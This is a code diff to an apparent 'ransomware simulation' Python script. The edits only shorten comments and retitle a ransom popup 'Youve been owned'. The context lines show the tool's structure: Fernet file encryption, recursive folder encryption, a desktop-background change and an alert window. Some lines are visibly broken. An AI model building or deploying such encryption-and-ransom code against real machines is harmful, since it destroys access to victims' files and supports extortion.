@@ -6,7 +6,7 @@
 # Purpose:                      Encrypt files with ransomware simulation options
 
 # Import necessary modules
-from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography.fernet module
+from cryptography.fernet import Fernet  # Import the Fernet
 import os  # Import the os module
 import ctypes  # Import ctypes for Windows API calls
 import urllib.request # used for downloading and saving background image
@@ -19,7 +19,7 @@ cipher_suite = Fernet(key)
 
 # Function to encrypt a file
 def encrypt_file(file_path):
-    # Open the file in binary mode for reading
+    # Open the file 
     with open(file_path, 'rb') as f:
         plaintext = f.read()
     # Encrypts text
@@ -34,7 +34,7 @@ def decrypt_file(file_path):
     with open(file_path, 'rb') as f:
         # Read the encrypted text from the file
         encrypted_text = f.read()
-    # Decrypt the encrypted text using the cipher_suite
+    # Decrypt the encrypted text
     decrypted_text = cipher_suite.decrypt(encrypted_text)
     # Open the file in binary mode for writing
     with open(file_path, 'wb') as f:
@@ -49,7 +49,7 @@ def encrypt_folder(folder_path):
             # Call function to encrypt file
             encrypt_file(file_path)
 
-# Function to recursively decrypt a folder that was encrypted by this tool
+# Function to recursively decrypt a folder that was encrypted
 def decrypt_folder(folder_path) 
     for root, dirs, files in os.walk(folder_path):
         for file in files:
@@ -69,7 +69,7 @@ def change_desktop_background(self):
 # Function to create ransomware popup window
 def create_popup(message):
     root = tk.Tk()
-    root.title("Ransomware Alert")
+    root.title("Youve been owned")
     label = tk.Label(root, text=message)
     label.pack()
     root.mainloop()
